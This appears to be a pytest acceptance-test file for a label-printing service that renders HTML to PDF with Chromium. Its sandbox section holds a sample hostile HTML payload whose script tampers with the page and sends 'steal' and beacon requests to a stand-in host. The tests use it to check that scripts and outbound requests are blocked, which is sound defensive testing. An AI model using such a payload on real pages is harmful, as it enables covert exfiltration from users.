"""Chromium-backed acceptance tests: 5 (SAWO label), 6 (overflow), 7 (versioning), 8 (overrides), 9 (sheet layouts),
10 (sandbox). They run inside the backend Docker image and are skipped where Chromium is not installed."""
import base64
import io
import json
import zipfile
from pathlib import Path

from app.render import engine
from app.render.html_pdf import html_pages_to_pdfs, wrap_document
from app.seed.sawo import SEED_DIR
from tests.conftest import login
from tests.helpers import body_for, chromium, page_count, pdf_text, sawo_id, squash  # noqa: F401


# ------------------------------------------------------------------ 10: sandbox ------------------------------------

EVIL = ('<html><body><p id="a">SAFE</p>'
        "<script>document.getElementById('a').textContent='PWNED';"
        "fetch('http://example.invalid/steal');new Image().src='http://example.invalid/beacon';</script>"
        '<img src="http://example.invalid/x.png"><link rel="stylesheet" href="http://example.invalid/s.css"></body></html>')


def test_sandbox_default_pipeline_runs_no_script_and_makes_no_requests(chromium):
    pdfs, report = html_pages_to_pdfs([EVIL], "A6")
    text = pdf_text(pdfs[0])
    assert "SAFE" in text and "PWNED" not in text
    assert report.blocked_requests == []
    assert any("script removed" in f for f in report.findings) and any("external" in f for f in report.findings)


def test_sandbox_network_is_blocked_even_if_the_sanitiser_is_bypassed(chromium):
    pdfs, report = html_pages_to_pdfs([EVIL], "A6", sanitize=False, csp=False)  # JS off + request interception only
    text = pdf_text(pdfs[0])
    assert "SAFE" in text and "PWNED" not in text  # script did not execute: JavaScript is disabled
    assert any("example.invalid/x.png" in u for u in report.blocked_requests)  # the request was intercepted and aborted


def test_sandbox_csp_stops_scripts_even_if_javascript_were_enabled(chromium):
    pdfs, report = html_pages_to_pdfs([EVIL], "A6", sanitize=False, javascript=True)  # CSP + interception only
    assert "PWNED" not in pdf_text(pdfs[0]) and "SAFE" in pdf_text(pdfs[0])


# ------------------------------------------------------------------ 5: SAWO label ----------------------------------

def test_sawo_label_from_a_real_so_flow(api, chromium):
    login(api, "bob")
    tid = sawo_id(api)
    r = api.post("/api/render/print", json=body_for(api, tid, options={"calc_mode": 1, "pefc": True, "logo": True}))
    assert r.status_code == 200, r.text
    text = squash(pdf_text(r.content))
    assert page_count(r.content) == 1
    assert "220-TD" in text and "S00123" in text
    assert "Thermometer Cut Corner Square 140x140mm, Cedar" in text  # description straight from Odoo, spacing intact
    assert "CornerSquare" not in text
    assert "5901234123457" in text.replace(" ", "")  # EAN-13 digits printed under the bars ("5 901234 123457")
    # PCS / KGS / CBM = 10 / 3.5 / 0.012
    assert "PCS KGS CBM" in text and "10 3.5 0.012" in text
    assert "LOGO" in text and "YES" in text and "NO" in text
    page = __import__("pypdf").PdfReader(io.BytesIO(r.content)).pages[0]
    assert round(float(page.mediabox.width) / (72 / 25.4)) == 105 and round(float(page.mediabox.height) / (72 / 25.4)) == 148
    assert len(page.images) >= 1  # product photo (the PEFC mark and logo are SVG, so vector)


def test_sawo_pefc_toggle_changes_the_label(api, chromium):
    login(api, "bob")
    tid = sawo_id(api)
    with_pefc = api.post("/api/render/print", json=body_for(api, tid, options={"pefc": True}))
    without = api.post("/api/render/print", json=body_for(api, tid, options={"pefc": False}))
    assert "PEFC" in squash(pdf_text(with_pefc.content)) and "PEFC" not in squash(pdf_text(without.content))


# ------------------------------------------------------------------ 6: overflow ------------------------------------

def _measure_desc(html: str) -> dict:
    """TEST-ONLY: JavaScript is enabled here to measure layout; production rendering never enables it."""
    from playwright.sync_api import sync_playwright

    with sync_playwright() as p:
        b = p.chromium.launch(args=["--no-sandbox"])
        pg = b.new_page()
        pg.set_content(wrap_document(html, 105, 148, csp=False))
        out = pg.evaluate("""() => { const e = document.querySelector('.desc');
            return {sh: e.scrollHeight, ch: e.clientHeight, sw: e.scrollWidth, cw: e.clientWidth,
                    lines: Math.round(e.scrollHeight / parseFloat(getComputedStyle(e).lineHeight)),
                    body: document.body.scrollHeight, bodyClient: document.body.clientHeight}}""")
        b.close()
    return out


def _sawo_html(name: str) -> str:
    files = {p.name: p.read_bytes() for p in (SEED_DIR / "assets").glob("*")}
    src = (SEED_DIR / "label.html").read_text(encoding="utf-8")
    src = engine.inline_assets(src, {f"assets/{k}": v for k, v in files.items()})
    vals = {"description": {"display": name, "raw": name, "type": "text", "overflow": "wrap"}}
    return engine.render(src, vals, mode="html")[0]


def test_product_names_wrap_or_shrink_without_clipping(chromium):
    normal = _measure_desc(_sawo_html("Thermometer Cut Corner Square 140x140mm, Cedar"))
    assert normal["sh"] <= normal["ch"] + 1 and normal["sw"] <= normal["cw"] + 1
    assert normal["lines"] >= 2  # it wraps onto a second line instead of running off the label
    very_long = "Thermometer Cut Corner Square 140x140mm, Cedar Heartwood Edition with Brass Hanger and Gift Box " * 2
    long = _measure_desc(_sawo_html(very_long))
    assert long["sh"] <= long["ch"] + 1 and long["sw"] <= long["cw"] + 1, long  # shrink rule kicked in, nothing clipped
    absurd = _measure_desc(_sawo_html("X" * 400))
    assert absurd["sh"] <= absurd["ch"] + 1  # unbroken text is force-wrapped (overflow-wrap:anywhere)


# ------------------------------------------------------------------ 8: overrides ------------------------------------

def test_override_is_on_the_label_and_in_the_log_with_the_calculated_value_and_odoo_is_untouched(api, chromium):
    login(api, "bob")
    tid = sawo_id(api)
    calls_before = len(api.odoo.calls)
    body = body_for(api, tid, overrides={"lines:11": {"kgs": "9.9"}})
    r = api.post("/api/render/print", json=body)
    assert r.status_code == 200, r.text
    assert "9.9" in squash(pdf_text(r.content)) and "3.5" not in squash(pdf_text(r.content))
    job = api.get(f"/api/print-jobs/{r.headers['x-print-job-id']}").json()
    assert job["overrides"] == {"lines:11": {"kgs": "9.9"}}
    calc = job["calculated"]["lines:11"]
    assert calc["calculated"]["kgs"] == 3.5 and calc["overrides"] == {"kgs": 9.9} and calc["final"]["kgs"] == 9.9
    methods = {m for _, m in api.odoo.calls[calls_before:]}
    assert methods <= {"search_read", "read", "search", "fields_get", "read_group"}  # nothing written back


def test_missing_weight_is_a_visible_warning_that_blocks_printing_until_acknowledged_or_overridden(api, chromium):
    login(api, "bob")
    tid = sawo_id(api)
    body = body_for(api, tid, line_id=12, so="S00124")
    prev = api.post("/api/render/preview", json=body).json()
    codes = {w["code"] for w in prev["warnings"]}
    assert {"missing_weight", "missing_volume"} <= codes  # Odoo's 0.0 is "unset", never printed as a silent 0
    assert prev["labels"][0]["calc"]["final"]["kgs"] is None
    blocked = api.post("/api/render/print", json=body)
    assert blocked.status_code == 422 and "warnings" in blocked.json()["detail"]
    body["overrides"] = {"*": {"kgs": 7, "cbm": 0.02}}
    prev2 = api.post("/api/render/preview", json=body).json()
    assert not {"missing_weight", "missing_volume"} & {w["code"] for w in prev2["warnings"]}
    body["acknowledge_warnings"] = True  # remaining warnings (e.g. missing photo) need a conscious yes
    assert api.post("/api/render/print", json=body).status_code == 200


# ------------------------------------------------------------------ 7: versioning + reprint -----------------------

def _sawo_zip(marker: str) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        html = (SEED_DIR / "label.html").read_text(encoding="utf-8").replace("Item code", f"Item code {marker}")
        z.writestr("label.html", html)
        for p in (SEED_DIR / "assets").glob("*"):
            z.writestr(f"assets/{p.name}", p.read_bytes())
    return buf.getvalue()


def test_editing_creates_version_2_and_reprint_of_a_v1_job_still_uses_v1_and_the_original_values(api, chromium):
    login(api, "alice")
    tid = sawo_id(api)
    job1 = api.post("/api/render/print", json=body_for(api, tid))
    assert job1.status_code == 200
    text1 = squash(pdf_text(job1.content))
    assert "V2MARK" not in text1

    v2 = api.post(f"/api/templates/{tid}/versions", files={"file": ("sawo.zip", _sawo_zip("V2MARK"))})
    assert v2.status_code == 201 and v2.json()["latest_version"] == 2 and v2.json()["active_version"] == 2
    job2 = api.post("/api/render/print", json=body_for(api, tid))
    assert "V2MARK" in squash(pdf_text(job2.content))
    assert api.get(f"/api/print-jobs/{job2.headers['x-print-job-id']}").json()["template_version"] == 2

    # Odoo data changes after the first print: a reprint must not drift
    api.odoo.data["product.product"][0]["name"] = "RENAMED IN ODOO"
    from app.resolver.service import so_cache

    so_cache.clear()
    calls_before = len(api.odoo.calls)
    rp = api.post(f"/api/print-jobs/{job1.headers['x-print-job-id']}/reprint", json={})
    assert rp.status_code == 200, rp.text
    assert squash(pdf_text(rp.content)) == text1  # identical content, original template v1, original data
    assert "RENAMED" not in squash(pdf_text(rp.content)) and "V2MARK" not in squash(pdf_text(rp.content))
    assert len(api.odoo.calls) == calls_before  # a reprint never contacts Odoo
    new_job = api.get(f"/api/print-jobs/{rp.headers['x-print-job-id']}").json()
    assert new_job["template_version"] == 1 and new_job["options"]["reprint_of"] == int(job1.headers["x-print-job-id"])


# ------------------------------------------------------------------ 9: layouts through the API -----------------------

def test_same_label_prints_1up_2up_4up_and_partial_sheet(api, chromium):
    login(api, "bob")
    tid = sawo_id(api)
    for kind, per in (("1up", 1), ("2up", 2), ("4up", 4)):
        p = api.post("/api/render/preview", json=body_for(api, tid, copies=3, layout={"kind": kind})).json()
        assert p["info"]["slots_per_sheet"] == per and p["label_count"] == 3
        assert p["info"]["sheets"] == -(-3 // per)
        pdf = base64.b64decode(p["pdf_base64"])
        assert squash(pdf_text(pdf)).count("S00123") == 3
    four = api.post("/api/render/preview", json=body_for(api, tid, copies=3, layout={"kind": "4up"})).json()
    assert four["info"]["empty_slots"] == 1
    start = api.post("/api/render/print", json=body_for(api, tid, copies=2, layout={"kind": "4up", "start_slot": 3},
                                                       acknowledge_warnings=True))
    assert start.status_code == 200 and page_count(start.content) == 2
    bad = api.post("/api/render/preview", json=body_for(api, tid, layout={"kind": "4up", "start_slot": 9}))
    assert bad.status_code == 422


def test_print_job_is_logged_with_user_selection_layout_and_snapshot(api, chromium):
    login(api, "bob")
    tid = sawo_id(api)
    r = api.post("/api/render/print", json=body_for(api, tid, copies=2, layout={"kind": "2up"}, printer="Office A4"))
    jobs = api.get("/api/print-jobs?so=S00123").json()
    assert len(jobs) == 1
    j = jobs[0]
    assert j["so_name"] == "S00123" and j["copies"] == 2 and j["layout"]["kind"] == "2up" and j["printer"] == "Office A4"
    assert j["user_uid"] == 8 and j["template"].startswith("SAWO") and j["selection"]["items"]
    assert j["id"] == int(r.headers["x-print-job-id"])
